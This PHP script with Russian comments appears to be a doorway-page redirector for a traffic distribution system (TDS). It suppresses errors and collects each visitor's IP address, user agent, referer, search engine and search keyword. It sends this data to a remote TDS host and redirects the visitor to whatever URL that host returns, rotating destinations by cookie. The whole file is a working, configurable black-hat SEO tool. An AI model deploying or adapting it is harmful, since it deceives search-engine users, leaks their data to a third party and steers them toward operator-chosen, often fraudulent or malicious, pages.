<?php
@ini_set('display_errors', '0');
@error_reporting(0);
$z_id = 'dwl';//ID группы
$z_api_key_host = 'LmRe4q';//API ключ
$z_url = 'http://tds.com/?api=';//ссылка на ТДС (замените только домен)
$z_get = 'q';//название GET параметра (http://doorway.com/go.php?q=keyword)
$z_out_reserved = 'http://site.com/[KEY]';//резервный URL, можно использовать макрос [KEY]
$z_rotator = 1;//включить ротатор и разрешить установку cookies (0/1)
$z_n_cookies = 'qwerty';//название cookies для посетителей
$z_t_cookies = 3600;//время жизни cookies в секундах
$z_connect = 1;//тип соединения, file_get_contents или curl (0/1)
$z_timeout_connect = 10;//таймаут соединения в секундах (только для curl)
/*Ниже ничего не изменяйте*/
$z_empty = '-';
$z_api_data = '';
if(isset($_GET[$z_get])){
	$z_key = $_GET[$z_get];
}
else{
	$z_key ='';
}
if(!empty($_SERVER['HTTP_USER_AGENT'])){
	$z_useragent = $_SERVER['HTTP_USER_AGENT'];
}
else{
	$z_useragent = $z_empty;
}
if(!empty($_SERVER['HTTP_REFERER'])){
	$z_referer  = $_SERVER['HTTP_REFERER'];
	if(stristr($z_referer, 'google')){$z_se = 'google';}
	if(stristr($z_referer, 'yandex')){$z_se = 'yandex';}
	if(stristr($z_referer, 'mail.ru')){$z_se = 'mail';}
	if(stristr($z_referer, 'yahoo')){$z_se = 'yahoo';}
	if(stristr($z_referer, 'bing')){$z_se = 'bing';}
	if(empty($z_se)){$z_se = $z_empty;}
}
else{
	$z_referer = $z_empty;
	$z_se = $z_empty;
}
if(isset($_SERVER['HTTP_X_FORWARDED_FOR']) && $_SERVER['HTTP_X_FORWARDED_FOR']){
	if(strpos($_SERVER['HTTP_X_FORWARDED_FOR'],".")>0 && strpos($_SERVER['HTTP_X_FORWARDED_FOR'],",")>0){
		$z_ip = explode(",",$_SERVER['HTTP_X_FORWARDED_FOR']);
		$z_ipuser = trim($z_ip[0]);
	}
	elseif(strpos($_SERVER['HTTP_X_FORWARDED_FOR'],".")>0 && strpos($_SERVER['HTTP_X_FORWARDED_FOR'],",")===false){
		$z_ipuser = trim($_SERVER['HTTP_X_FORWARDED_FOR']);
	}
}
if(!isset($z_ipuser)){
	$z_ipuser = trim($_SERVER['REMOTE_ADDR']);
}
if(!filter_var($z_ipuser, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) && !filter_var($z_ipuser, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)){
	$z_ipuser = $z_empty;
}
$z_lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
if(empty($z_lang)){
	$z_lang = $z_empty;
}
$z_domain = $_SERVER['HTTP_HOST'];
if($z_rotator == 1){
	if(!isset($_COOKIE[$z_n_cookies])){
		SetCookie($z_n_cookies, 0, time() + $z_t_cookies, '/');
		$z_c_counter = 0;
		$z_uniq = 'yes';
	}
	else{
		$z_c_counter = $_COOKIE[$z_n_cookies] + 1;
		SetCookie($z_n_cookies, $z_c_counter, time() + $z_t_cookies, '/');
		$z_uniq = 'no';
	}
}
else{
	$z_uniq = 'yes';
}
$z_data = array(
"api_key_host"=>$z_api_key_host,
"id"=>$z_id,
"ipuser"=>$z_ipuser,
"lang"=>$z_lang,
"referer"=>$z_referer,
"useragent"=>$z_useragent,
"uniq"=>$z_uniq,
"domain"=>$z_domain,
"se"=>$z_se,
"key"=>urlencode($z_key)
);
$z_data = $z_url.base64_encode(serialize($z_data));
if($z_connect == 0){
	$z_api_data = @file_get_contents($z_data);
}
else{
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_TIMEOUT, $z_timeout_connect);
	curl_setopt($ch, CURLOPT_URL, $z_data);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	$z_api_data = curl_exec($ch);
	curl_close($ch);
}
if(stristr($z_api_data, '|||') && $z_rotator == 1){
	$z_out_ex = explode('|||', html_entity_decode($z_api_data, ENT_QUOTES, 'UTF-8'));
	if(isset($z_out_ex[$z_c_counter])){
		$z_test = trim($z_out_ex[$z_c_counter]);
	}
	if(!empty($z_test)){
		$z_out = trim($z_out_ex[$z_c_counter]);
	}
	else{
		$z_out = trim($z_out_ex[0]);
		SetCookie($z_n_cookies, 0, time() + $z_t_cookies, '/');
		$z_c_counter = 0;
	}
}
else{
	if(stristr($z_api_data, '|||')){
		$z_out_ex = explode('|||', html_entity_decode($z_api_data, ENT_QUOTES, 'UTF-8'));
		$z_out = trim($z_out_ex[0]);
	}
	else{
		$z_out = trim(html_entity_decode($z_api_data, ENT_QUOTES, 'UTF-8'));
	}
}
if(empty($z_out)){
	$z_out = $z_out_reserved;
	if(stristr($z_out, '[KEY]')){
		$z_key = urlencode($z_key);
		$z_out = str_ireplace('[KEY]', $z_key, $z_out);
	}
}
header("Location: $z_out");
exit();
/*
Если ротатор выключен, аутом будет первый URL, уникальность "по cookies" работать не будет.
*/
?>